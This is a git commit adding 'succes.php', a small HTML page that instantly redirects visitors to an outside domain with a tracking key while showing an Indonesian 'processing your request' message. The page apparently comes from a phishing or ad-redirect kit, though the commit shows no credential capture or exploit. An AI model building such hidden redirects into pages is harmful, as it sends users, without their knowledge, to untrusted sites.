747e0d1544fc5acfb149b33adebede9c5eca6e9b
Bigvana <82066545+Bigvana@users.noreply.github.com>
2024-08-21 09:36:42 +0700

    Add files via upload

---
+++ succes.php
@@ -0,0 +1,18 @@
+<html>
+<head>
+<meta http-equiv="REFRESH" content="0;url=https://winewiden.com/xf2y3jue3?key=725646f7cd6c41593a3fd212cf9bc4e0"></pre>
+<title>Redirect dengan tag meta</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link href="css/f_h1NZqvg5HEtHijgWC9ooa14ggIOeVaVs_1585706428_lpf.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width">
+  <pre>
+</head>
+
+<body>
+
+Sedang memproses permintaan anda......!
+
+</body>
+
+</html>
